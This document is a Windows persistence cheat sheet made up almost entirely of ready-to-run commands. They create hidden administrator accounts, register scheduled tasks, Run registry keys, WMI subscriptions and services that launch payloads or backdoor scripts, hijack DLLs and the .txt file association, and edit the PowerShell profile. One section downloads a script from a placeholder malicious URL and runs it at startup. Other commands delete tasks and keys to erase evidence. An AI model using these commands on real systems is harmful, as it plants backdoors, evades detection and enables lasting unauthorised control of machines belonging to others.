# User Accounts

#### Create a New Local User
- Create a new local user with a specified password:
	```cmd
	net user <username> <password> /add
	```

#### Add User to Administrators Group
- Add the newly created user to the Administrators group to ensure elevated privileges:
	```cmd
	net localgroup administrators <username> /add
	```

#### Enable a Disabled User Account
- Enable a disabled user account to maintain access:
	```cmd
	net user <username> /active:yes
	```

#### Modify User Password
- Change the password for an existing user:
	```cmd
	net user <username> <new_password>
	```

# Scheduled Tasks

#### Create a Scheduled Task for Persistence
- Schedule a task to run a script or executable at startup:
	```cmd
	schtasks /create /tn "PersistenceTask" /tr "cmd.exe /c <path_to_payload>" /sc onstart /ru system
	```

#### Modify an Existing Scheduled Task
- Modify the task's action to point to a malicious executable:
	```cmd
	schtasks /change /tn "PersistenceTask" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\Backdoor.ps1"
	```

#### Delete a Scheduled Task
- Remove a scheduled task to clean up evidence:
	```cmd
	schtasks /delete /tn "PersistenceTask" /f
	```

# Registry Keys

#### Add Registry Key for Startup Persistence (User)
- Add a value to the user-level `Run` key to execute a payload at login:
	```cmd
	reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyBackdoor /t REG_SZ /d "C:\path\to\payload.exe" /f
	```

#### Add Registry Key for Startup Persistence (System)
- For system-wide persistence, add the value to the system's `Run` key:
	```cmd
	reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v MyBackdoor /t REG_SZ /d "C:\path\to\payload.exe" /f
	```

#### Remove a Registry Key
- Remove a specific registry key to clean up persistence:
	```cmd
	reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyBackdoor /f
	```

# Startup Folder

#### Add a Program to the Startup Folder (User)
- Copy a malicious executable to the current user’s startup folder:
	```cmd
	copy <path_to_payload> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\malicious.exe"
	```

#### Add a Program to the Startup Folder (All Users)
- Copy a malicious executable to the all-users startup folder:
	```cmd
	copy <path_to_payload> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\malicious.exe"
	```

# Windows Management Instrumentation (WMI)

#### Create a WMI Event Subscription
- Create a WMI event subscription that runs a script when a specific process is started:
	```cmd
	@echo off
	@set query="SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='explorer.exe'"
	@set cmd="powershell.exe -ExecutionPolicy Bypass -File C:\path\to\backdoor.ps1"
	@wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name='PersistenceFilter', EventNamespace='root\cimv2', QueryLanguage='WQL', Query=%query%
	@wmic /namespace:\\root\subscription PATH CommandLineEventConsumer CREATE Name='PersistenceConsumer', CommandLineTemplate=%cmd%, ExecutablePath='powershell.exe'
	@wmic /namespace:\\root\subscription PATH __FilterToConsumerBinding CREATE Filter='\\\\.\\root\\subscription:__EventFilter.Name="PersistenceFilter"', Consumer='\\\\.\\root\\subscription:CommandLineEventConsumer.Name="PersistenceConsumer"'
	```

# Service Creation

#### Create a Malicious Service
- Create a service that runs a malicious executable:
	```cmd
	sc create MaliciousService binPath= "C:\path\to\malicious.exe" start= auto
	```

#### Start the Service
- Start the malicious service:
	```cmd
	net start MaliciousService
	```

# DLL Hijacking

#### Identify Vulnerable DLLs in Use
- List DLLs loaded by a process (replace `<pid>` with the process ID):
	```cmd
	tasklist /m
	```

#### Replace a DLL for Hijacking
- Copy a malicious DLL to a vulnerable directory where it will be loaded by an application:
	```cmd
	copy <path_to_malicious.dll> "C:\Program Files\VulnerableApp\legit.dll"
	```

# BITS Jobs (Background Intelligent Transfer Service)

#### Create a Persistent BITS Job
- Create a BITS job that downloads a malicious script and runs it on system startup:
	```cmd
	bitsadmin /create MyBitsJob
	bitsadmin /addfile MyBitsJob http://<malicious_url> C:\Temp\malicious.ps1
	bitsadmin /resume MyBitsJob
	schtasks /create /tn "BitsPersistence" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\Temp\malicious.ps1" /sc onstart /ru system
	```

# File Association Hijacking

#### Change File Association to Run Malicious Code
- Change the association for `.txt` files to run a malicious executable:
	```cmd
	assoc .txt=txtfile
	ftype txtfile="C:\path\to\malicious.exe" %1
	```

# PowerShell Profile

#### Modify PowerShell Profile for Persistence
- Add a command to the user's PowerShell profile to run a payload when PowerShell starts:
	```cmd
	echo Start-Process "C:\path\to\payload.exe" >> %userprofile%\Documents\WindowsPowerShell\profile.ps1
	```
